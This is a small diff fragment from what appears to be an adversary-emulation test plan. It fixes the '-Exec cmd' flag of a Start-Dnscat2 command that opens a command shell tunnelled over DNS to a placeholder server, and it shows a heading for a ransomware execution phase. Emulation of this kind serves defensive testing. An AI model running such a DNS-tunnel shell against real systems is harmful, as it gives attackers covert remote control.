@@ -738,7 +738,7 @@
   executors:
     - name: powershell
       command: |
-        Start-Dnscat2 -Domain #{dnscat2_server} Exec cmd
+        Start-Dnscat2 -Domain #{dnscat2_server} -Exec cmd
 
 # Phase 2: Execution - Ransomware
 
